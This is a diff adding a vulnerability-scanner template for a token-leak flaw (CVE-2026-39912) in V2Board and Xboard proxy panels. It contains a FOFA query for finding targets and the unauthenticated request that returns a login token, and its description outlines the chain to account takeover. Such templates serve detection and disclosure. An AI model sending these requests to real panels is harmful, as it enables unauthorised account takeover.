@@ -1,0 +1,34 @@
+id: v2board-loginwithmaillink-token-leak
+
+info:
+  name: "V2Board loginWithMailLink接口身份验证令牌泄露漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="V2Board"
+    V2Board 是一款开源的轻量级多用户代理服务管理面板。
+    在 V2Board 1.6.1 至 1.7.4 版本以及 Xboard 0.1.9 及之前版本中，loginWithMailLink 接口存在身份验证令牌泄露风险。攻击者利用该漏洞，可通过未认证的请求获取明文返回的 auth_data 令牌，进而结合 /api/v1/user/info 接口接管用户账户，实现从信息泄露到权限提升的完整攻击链。
+  reference:
+  - CVE-2026-39912
+  tags: V2Board
+
+http:
+- raw:
+  - |
+    POST /api/v1/passport/auth/loginWithMailLink HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Content-Type: application/json
+
+    {"email":"admin@demo.com"}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+      - 'login?verify='
+      - 'message'
+      - 'status'
+    condition: and
